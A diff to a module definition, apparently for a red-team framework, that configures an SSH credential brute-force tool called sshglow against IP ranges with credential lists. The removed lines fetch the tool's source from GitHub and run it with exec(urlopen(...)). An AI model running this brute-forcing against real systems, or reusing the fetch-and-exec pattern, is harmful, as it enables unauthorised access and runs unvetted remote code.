@@ -10,7 +10,7 @@ output_extension: ''
 needs_admin: false
 opsec_safe: true
 language: python
-min_language_version: '2.6'
+min_language_version: '3.6'
 comments:
   - https://github.com/abdallah-elsharif/sshglow
 options:
@@ -19,22 +19,17 @@ options:
     required: true
     value: ''
   - name: Targets
-    description: target to scan in single or Range ex(192.168.1.1-10) or CIDR format
+    description: target to scan in single or Range ex(192.168.1.1-10) or CIDR format or (Attacker)File
     required: true
     value: ''
   - name: Creds
-    description: (Victim)File or user1:pass1,user2:pass2 or only one
+    description: (Attacker)File or user1:pass1,user2:pass2 or only one
     required: true
     value: ''
   - name: Delay
     description: Delay interval in seconds
     required: true
     value: '5'
-script: |
-  import urllib
-  from urllib.request import urlopen
-  try:
-      exec(urlopen("https://raw.githubusercontent.com/abdallah-elsharif/sshglow/main/sshglow.py").read().decode("utf-8"))
-      run("{{ Targets }}","{{ Creds }}",delay={{ Delay }})
-  except urllib.error.URLError:
-      print("\033[0;31m[!]\033[0;37m We need internet access to load sshglow")
+
+advanced:
+  custom_generate: true
